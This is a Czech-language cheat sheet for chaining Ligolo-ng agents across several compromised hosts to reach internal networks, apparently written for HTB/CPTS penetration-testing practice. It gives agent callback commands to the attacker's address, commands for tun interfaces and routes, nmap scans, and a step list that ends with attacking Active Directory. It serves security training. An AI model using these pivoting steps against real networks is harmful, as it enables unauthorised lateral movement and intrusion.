# 🕸️ Ligolo-ng Double Pivot / Multi Pivot Cheat Sheet

## Co je Double Pivot?

**Double pivot** znamená, že se přesuneš přes více kompromitovaných strojů, protože každý další server vidí jinou část sítě.

Typický scénář:

```text
KALI
10.10.14.5
   |
   |
   v
SERVER 1 (Pivot 1)
10.129.10.20
172.16.5.10
   |
   |
   v
SERVER 2 (Pivot 2)
172.16.5.20
192.168.50.10
   |
   |
   v
SERVER 3 / DC
192.168.50.50
```

Kali přímo nevidí:

```
192.168.50.0/24
```

Ale:

* Pivot 1 vidí Pivot 2
* Pivot 2 vidí cílovou síť

Řešení:

**Ligolo-ng chainování agentů.**

---

# Princip více pivotů

Každý pivot má svého agenta:

```text
KALI
 |
 | Ligolo Agent 1
 |
Pivot 1
 |
 | Ligolo Agent 2
 |
Pivot 2
 |
 | Ligolo Agent 3
 |
Internal Network
```

Každý další agent používá předchozí pivot jako cestu ven.

---

# Topologie

Příklad:

## Kali

```
10.10.14.5
```

---

## Pivot 1

Dvě síťové karty:

```
eth0:
10.129.10.20

eth1:
172.16.5.10
```

---

## Pivot 2

```
eth0:
172.16.5.20

eth1:
192.168.50.10
```

---

## Cíl

```
192.168.50.50
```

---

# Pivot 1 – první tunel

## Kali

Spustíš proxy:

```bash
sudo ./proxy -selfcert
```

---

## Pivot 1

Spustíš agenta:

```bash
./agent -connect 10.10.14.5:11601 -ignore-cert
```

---

Na Kali:

Vybereš session:

```bash
session
```

Například:

```
1 - Pivot1
```

Aktivuješ:

```bash
1
```

---

# Vytvoření prvního tunelu

Na Kali:

```bash
sudo ip tuntap add user kali mode tun ligolo
```

Zapnutí:

```bash
sudo ip link set ligolo up
```

---

Přidáš route:

```bash
sudo ip route add 172.16.5.0/24 dev ligolo
```

Nyní:

Kali → Pivot 1 → síť 172.16.5.0/24

---

# Pivot 2 – druhý agent

Teď jsi přes Pivot 1 schopný komunikovat s Pivot 2.

Pivot 2:

```
172.16.5.20
```

Na Pivot 2 nahraješ dalšího agenta.

---

## Spuštění agenta na Pivot 2

Důležité:

Pivot 2 se nepřipojuje přímo na Kali.

Připojí se na Pivot 1:

```bash
./agent -connect 172.16.5.10:11601 -ignore-cert
```

---

Proč?

Protože:

Pivot 2:

❌ nevidí Kali

ale:

✅ vidí Pivot 1

---

# Přidání druhého agenta v Ligolo

Na Kali:

```bash
session
```

Výsledek:

```
1 - Pivot1
2 - Pivot2
```

Vybereš:

```
2
```

---

# Druhý TUN interface

Pro čistší správu vytvoříš další tun:

```bash
sudo ip tuntap add user kali mode tun ligolo2
```

Aktivace:

```bash
sudo ip link set ligolo2 up
```

---

Route na druhou síť:

```bash
sudo ip route add 192.168.50.0/24 dev ligolo2
```

---

# Start druhého tunelu

V session Pivot 2:

```text
start
```

---

Výsledek:

```text
KALI
 |
 |
Ligolo Tunnel 1
 |
 |
Pivot 1
 |
 |
Ligolo Tunnel 2
 |
 |
Pivot 2
 |
 |
192.168.50.0/24
```

---

# Test

Z Kali:

```bash
ping 192.168.50.50
```

nebo:

```bash
nmap -sT -Pn 192.168.50.50
```

---

# Triple Pivot (3 servery)

Stejný princip:

```text
KALI

 |

Pivot 1

 |

Pivot 2

 |

Pivot 3

 |

Target Network
```

---

Příklad:

```
10.10.14.5
    |
    |
10.129.10.20
    |
    |
172.16.5.20
    |
    |
192.168.50.20
    |
    |
192.168.100.50
```

---

## Agent chain:

### Pivot 1:

```bash
agent -connect KALI:11601
```

---

### Pivot 2:

```bash
agent -connect Pivot1:11601
```

---

### Pivot 3:

```bash
agent -connect Pivot2:11601
```

---

Route:

```bash
ip route add 192.168.100.0/24 dev ligolo3
```

---

# Důležitá věc: Routing musí existovat

Každý pivot musí vědět, kam posílat další síť.

Kontrola:

Linux:

```bash
ip route
```

Windows:

```cmd
route print
```

Musíš mít:

```
Pivot1 → Pivot2 síť
Pivot2 → Pivot3 síť
```

---

# Double Pivot vs SOCKS chaining

## SOCKS chaining:

```
proxychains
 |
SOCKS1
 |
SOCKS2
 |
Target
```

Nevýhody:

* pomalé
* špatně funguje s některými nástroji
* musíš nastavovat proxy

---

## Ligolo chaining:

```
Kali Routing Table

192.168.50.0/24
        |
        |
      ligolo
        |
      Pivot
        |
      Pivot
```

Výhody:

✅ Nmap funguje normálně
✅ RDP funguje normálně
✅ BloodHound funguje normálně
✅ žádné proxychains

---

# CPTS / HTB poznámka

Nejčastější scénář:

```
Internet
 |
Linux Server
 |
Windows Server
 |
Domain Controller
```

Postup:

1. Exploit první server
2. Nahraj Ligolo agent
3. Přidej route
4. Najdi další pivot
5. Nahraj druhého agenta
6. Přidej další route
7. Útoč na AD

---

# Zapamatovat

```
Ligolo-ng multi pivot =
jeden agent na každý segment sítě
+
jeden tunel pro každou novou síť
+
route přes správný interface
```

Pro CPTS je důležité hlavně:

* pochopit síťovou topologii
* vědět, který pivot kam vidí
* umět přidat správnou route
* umět chainovat více agentů
